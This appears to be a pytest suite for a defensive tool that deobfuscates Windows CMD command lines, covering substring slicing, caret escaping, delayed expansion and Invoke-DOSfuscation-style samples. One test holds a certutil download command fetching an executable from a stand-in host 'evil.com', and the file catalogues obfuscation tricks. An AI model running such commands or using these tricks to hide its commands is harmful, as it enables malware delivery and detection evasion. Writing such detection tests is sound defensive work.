"""RC4.4 · CMD Runtime Reconstruction Engine regression tests.

Covers every requirement from the RC4.4 acceptance spec:
    * Character slicing (calc.exe reconstruction)
    * Nested substring expansion
    * Delayed expansion !VAR!
    * Adjacent variables
    * Caret escaping
    * Quote fragmentation
    * Comma insertion
    * Mixed CMD + PowerShell
    * Environment concatenation
    * Invoke-DOSfuscation-style samples
    * Real-malware LOLBIN reconstruction
    * Red-team tooling patterns
    * Malformed / partial commands
    * Windows profile switching
    * Custom analyst-supplied env
    * Honest partial-reconstruction verdict when a variable is unknown
"""
from __future__ import annotations
import sys, pytest
sys.path.insert(0, "/app/backend")

from operations import OPERATIONS  # noqa
import ops_extended  # noqa

# ensure decoders + ops are all registered
from decoders import (  # noqa: F401
    ps_encodedcommand_multilayer, ps_inline_eval, batch_envvar_substitute,
    ps_reverse_swap, ps_semantic_mini, ps_normalizer,
    cmd_runtime_reconstruct as crr,
    crypto_api_annotator, rc4_inline_decrypt,
)
from operations import run_operation


# ── 1) Success criterion — calc.exe reconstruction ────────────────
def test_success_criterion_calc_exe_reconstruction():
    src = ("cmd.exe /c %SystemRoot:~0,1%%ProgramFiles:~8,1%"
            "%PUBLIC:~-3,1%%SystemRoot:~0,1%.exe")
    r = crr.run_cmd_runtime_reconstruct(src)
    assert r["reconstructed"] == "cmd.exe /c CalC.exe"
    assert r["expected_executable"] == "cmd.exe"
    assert r["expected_child"] == "calc.exe"
    # Character trace: C + a + l + C
    chars = [t["character"] for t in r["character_trace"]]
    assert chars == ["C", "a", "l", "C"]
    # Verdict must be honest — benign-demonstration since it launches calc.
    assert r["verdict"]["verdict"] == "benign-demonstration"
    assert r["verdict"]["confidence"] >= 80
    # Confidence breakdown carries all four dimensions
    for key in ("parser", "environment", "runtime_reconstruction",
                "behavioral", "overall"):
        assert key in r["confidence"]
    # ATT&CK must contain T1027 + T1140 + T1059.003 (obfuscation +
    # deobfuscation + cmd shell) but NOT T1218 (child is calc.exe).
    ids = {h["id"] for h in r["mitre"]}
    assert {"T1027", "T1140", "T1059.003"}.issubset(ids)
    assert "T1218" not in ids


# ── 2) Substring semantics (matches cmd.exe help set) ─────────────
def test_substring_positive_index_and_length():
    assert crr.cmd_substring("HELLOWORLD", 0, 5) == "HELLO"
    assert crr.cmd_substring("HELLOWORLD", 5, 5) == "WORLD"


def test_substring_negative_start():
    # Last three chars
    assert crr.cmd_substring("HELLOWORLD", -3, None) == "RLD"
    assert crr.cmd_substring("HELLOWORLD", -3, 1) == "R"


def test_substring_negative_length_end_offset():
    # length=-2 means "leave 2 chars off the end"
    assert crr.cmd_substring("HELLOWORLD", 0, -2) == "HELLOWOR"
    assert crr.cmd_substring("HELLOWORLD", 2, -3) == "LLOWO"


def test_substring_out_of_range_returns_empty():
    assert crr.cmd_substring("ABC", 10, 5) == ""
    assert crr.cmd_substring("ABC", -100, None) == "ABC"


# ── 3) Nested substring expansion (multi-pass) ────────────────────
def test_nested_expansion_multi_pass():
    # Manually build a nested chain: set A=%SystemRoot% && echo %A:~0,1%
    src = "set A=%SystemRoot% && echo %A:~0,1%"
    r = crr.run_cmd_runtime_reconstruct(src)
    assert r["reconstructed"].strip().endswith("C")


# ── 4) Delayed expansion !VAR! ────────────────────────────────────
def test_delayed_expansion():
    src = "cmd /V:ON /c set A=calc && set B=.exe && !A!!B!"
    r = crr.run_cmd_runtime_reconstruct(src)
    assert "calc.exe" in r["reconstructed"]
    assert r["expected_child"] == "calc.exe"
    assert r["flags"]["had_delayed_expansion"] is True


# ── 5) Adjacent variables (concatenation) ─────────────────────────
def test_adjacent_variables():
    src = "%SystemRoot%%HOMEPATH%\\calc.exe"
    r = crr.run_cmd_runtime_reconstruct(src)
    assert r["reconstructed"] == r"C:\Windows\Users\user\calc.exe"


# ── 6) Caret escaping ─────────────────────────────────────────────
def test_caret_escaping():
    src = "c^m^d.exe /c c^a^l^c.exe"
    r = crr.run_cmd_runtime_reconstruct(src)
    assert r["reconstructed"] == "cmd.exe /c calc.exe"
    assert r["flags"]["had_caret_escape"] is True


# ── 7) Quote fragmentation ────────────────────────────────────────
def test_quote_fragmentation():
    src = '"c""m""d"'
    r = crr.run_cmd_runtime_reconstruct(src)
    # `""` collapses — result is `"cmd"`
    assert r["normalized"] == '"cmd"'
    assert r["flags"]["had_quote_fragmentation"] is True


# ── 8) Comma insertion (no-op for CMD parser; must not crash) ────
def test_comma_insertion_not_a_cmd_separator():
    src = "cmd.exe,/c,calc.exe"
    r = crr.run_cmd_runtime_reconstruct(src)
    # cmd.exe does NOT treat comma as a separator, so we don't rewrite
    # it — the decoder must still return a coherent structure.
    assert "reconstructed" in r
    assert isinstance(r["verdict"]["confidence"], int)


# ── 9) Mixed CMD + PowerShell ─────────────────────────────────────
def test_mixed_cmd_powershell():
    src = "cmd /c %SystemRoot:~0,1%:\\powershell.exe -Command \"Write-Host hi\""
    r = crr.run_cmd_runtime_reconstruct(src)
    assert "C:\\powershell.exe" in r["reconstructed"]


# ── 10) Environment concatenation ─────────────────────────────────
def test_environment_concat_full_path():
    src = "%SystemRoot%\\System32\\calc.exe"
    r = crr.run_cmd_runtime_reconstruct(src)
    assert r["reconstructed"] == r"C:\Windows\System32\calc.exe"


# ── 11) Invoke-DOSfuscation-style ────────────────────────────────
def test_invoke_dosfuscation_style():
    # Realistic Invoke-DOSfuscation slice-heavy fragment
    src = ("cmd /c %ComSpec:~0,1%%ComSpec:~1,1%%ComSpec:~2,1%"
            "%ComSpec:~3,1%%ComSpec:~4,1%%ComSpec:~5,1%%ComSpec:~6,1%")
    r = crr.run_cmd_runtime_reconstruct(src)
    # ComSpec = C:\Windows\System32\cmd.exe → chars 0-6 = "C:\Wind"
    assert r["reconstructed"] == "cmd /c C:\\Wind"
    assert len(r["character_trace"]) == 7


# ── 12) LOLBIN malicious verdict ─────────────────────────────────
def test_lolbin_malicious_verdict():
    src = "cmd /c certutil.exe -urlcache -f http://evil.com/x.exe C:\\a.exe"
    r = crr.run_cmd_runtime_reconstruct(src)
    assert r["verdict"]["verdict"] == "malicious"
    assert r["verdict"]["category"] == "lolbin-execution"


# ── 13) Malformed / unknown var → partial-reconstruction ─────────
def test_unknown_variable_partial_reconstruction():
    src = "cmd /c %UNKNOWNVAR:~0,1%.exe"
    r = crr.run_cmd_runtime_reconstruct(src)
    assert r["verdict"]["verdict"] == "partial-reconstruction"
    assert "unknownvar" in r["unresolved_vars"]
    assert r["confidence"]["overall"] < 90


# ── 14) %% literal percent ────────────────────────────────────────
def test_percent_literal_escape():
    src = "echo 50%% off"
    r = crr.run_cmd_runtime_reconstruct(src)
    assert r["reconstructed"] == "echo 50% off"


# ── 15) Profile switching (Windows Server 2019 alt paths) ────────
def test_profile_switch_server_2019():
    src = "%USERPROFILE%"
    r = crr.run_cmd_runtime_reconstruct(src, profile_name="windows-server-2019")
    assert r["reconstructed"] == r"C:\Users\Administrator"


# ── 16) Custom analyst-supplied env ──────────────────────────────
def test_custom_analyst_env_override():
    src = "%MYVAR%"
    r = crr.run_cmd_runtime_reconstruct(
        src, custom_env={"MYVAR": "custom_value"},
    )
    assert r["reconstructed"] == "custom_value"


# ── 17) String substitution %VAR:from=to% ────────────────────────
def test_string_substitution():
    src = "%SystemRoot:Windows=Linux%"
    r = crr.run_cmd_runtime_reconstruct(src)
    assert r["reconstructed"] == r"C:\Linux"


# ── 18) @op registration + banner render ─────────────────────────
def test_op_registration_and_banner():
    banner = run_operation(
        "cmd-runtime-reconstruct",
        "cmd.exe /c %SystemRoot:~0,1%%ProgramFiles:~8,1%.exe",
        {},
    )
    assert "CMD RUNTIME RECONSTRUCTION" in banner
    assert "Character Extraction Table" in banner
    assert "Confidence Breakdown" in banner
    assert "ATT&CK Mapping" in banner
    assert "Verdict:" in banner
    assert "Reconstruction Trace" in banner


# ── 19) BaseDecoder detect() confidence ──────────────────────────
def test_base_decoder_detect_confidence():
    dec = crr.CmdRuntimeReconstructDecoder()
    from engine.models import AnalysisContext, Fingerprint
    fp = Fingerprint(input_len=17)
    ctx = AnalysisContext()
    r = dec.detect("%SystemRoot:~0,1%", fp, ctx)
    assert r.confidence >= 0.99


# ── 20) Zero-obfuscation input must not run reconstruction ───────
def test_zero_obfuscation_no_change():
    src = "echo hello"
    r = crr.run_cmd_runtime_reconstruct(src)
    assert r["reconstructed"] == "echo hello"
    assert r["flags"]["had_obfuscation"] is False
